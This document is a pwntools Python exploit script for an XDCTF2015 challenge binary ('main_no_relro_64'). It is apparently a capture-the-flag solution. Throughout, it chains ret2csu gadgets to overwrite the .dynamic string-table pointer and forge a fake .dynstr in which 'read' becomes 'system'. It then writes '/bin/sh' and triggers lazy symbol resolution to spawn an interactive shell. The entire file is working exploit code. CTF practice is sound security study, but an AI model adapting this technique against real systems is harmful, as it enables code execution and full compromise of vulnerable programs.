from pwn import *
# context.log_level="debug"
# context.terminal = ["tmux","splitw","-h"]
context.arch="amd64"
io = process("./main_no_relro_64")
elf = ELF("./main_no_relro_64")

bss_addr = elf.bss()
print(hex(bss_addr))
csu_front_addr = 0x400750
csu_end_addr = 0x40076A
leave_ret  =0x40063c
poprbp_ret = 0x400588
def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    return payload

io.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set rsp = new_stack
stack_size = 0x200 # new stack size is 0x200
new_stack = bss_addr+0x100

# modify .dynstr pointer in .dynamic section to a specific location
rop = ROP("./main_no_relro_64")
offset = 112+8
rop.raw(offset*'a')
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600988+8,8))  
rop.raw(0x400607)
rop.raw("a"*(256-len(rop.chain())))
print(rop.dump())
print(len(rop.chain()))
assert(len(rop.chain())<=256)
rop.raw("a"*(256-len(rop.chain())))
io.send(rop.chain())
io.send(p64(0x600B30+0x100))


# construct a fake dynstr section
rop = ROP("./main_no_relro_64")
rop.raw(offset*'a')
dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace("read","system")
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600B30+0x100,len(dynstr)))  
rop.raw(0x400607)
rop.raw("a"*(256-len(rop.chain())))
io.send(rop.chain())
io.send(dynstr)

# read /bin/sh\x00
rop = ROP("./main_no_relro_64")
rop.raw(offset*'a')
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600B30+0x100+len(dynstr),len("/bin/sh\x00")))  
rop.raw(0x400607)
rop.raw("a"*(256-len(rop.chain())))
io.send(rop.chain())
io.send("/bin/sh\x00")


rop = ROP("./main_no_relro_64")
rop.raw(offset*'a')
rop.raw(0x0000000000400771) #pop rsi; pop r15; ret; 
rop.raw(0)
rop.raw(0)
rop.raw(0x0000000000400773)
rop.raw(0x600B30+0x100+len(dynstr))
rop.raw(0x400516) # the second instruction of read@plt 
rop.raw(0xdeadbeef)
rop.raw('a'*(256-len(rop.chain())))
print(rop.dump())
print(len(rop.chain()))
io.send(rop.chain())
io.interactive()